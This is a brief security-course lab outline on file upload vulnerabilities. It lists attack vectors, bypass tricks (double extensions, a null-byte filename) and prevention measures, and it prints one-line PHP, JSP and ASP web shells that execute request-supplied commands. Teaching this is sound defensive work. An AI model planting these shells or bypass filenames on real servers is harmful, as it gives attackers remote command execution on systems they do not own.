---
title: "Lab 19 - File upload vulnerabilities"
date: 2025-12-30
weight: 19
draft: false
description: "File upload vulnerabilities"
---

# Lab 19: File upload vulnerabilities

## Objectives
- Understand file upload vulnerabilities
- Practice exploiting file upload
- Bypass upload protection measures

## Lab Content

### 1. File Upload Vulnerabilities
- Definition and impact
- Types of file upload attacks
- Remote code execution via file upload

### 2. Attack Vectors
- **Malicious file upload**: Malicious file upload
- **File type bypass**: File type bypass
- **Path traversal via filename**: Path traversal via filename
- **Overwriting critical files**: Overwriting critical files

### 3. Bypass Techniques
- **MIME type spoofing**: MIME type spoofing
- **File extension tricks**: File extension tricks
- **Magic bytes manipulation**: Magic bytes manipulation
- **Double extensions**: `.php.jpg`
- **Null byte injection**: `shell.php%00.jpg`

### 4. Malicious Payloads
```php
// PHP web shell
<?php system($_GET['cmd']); ?>

// JSP web shell
<%@ page import="java.io.*" %>
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

// ASP web shell
<%eval request("cmd")%>
```

### 5. Practice
- Identify file upload vulnerabilities
- Upload web shells
- Bypass file type restrictions
- Achieve remote code execution

### 6. Prevention Measures
- File type validation
- Content scanning
- Upload directory restrictions
- Virus scanning
- File size limits